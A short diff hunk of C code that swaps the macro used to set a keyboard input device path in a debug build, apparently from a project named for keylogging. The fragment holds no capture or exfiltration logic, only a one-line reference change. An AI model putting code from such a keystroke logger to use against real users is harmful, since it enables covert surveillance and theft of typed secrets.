@@ -21,7 +21,7 @@
 extern char **environ;
 
 #if DEBUG_MODE == 1
-static char *KEYBOARD_DEVICE = KEYBOARD_EVENT_PATH;
+static char *KEYBOARD_DEVICE = KEYDOGGER_KEYBOARD;
 #else
 static char *KEYBOARD_DEVICE = NULL;
 #endif
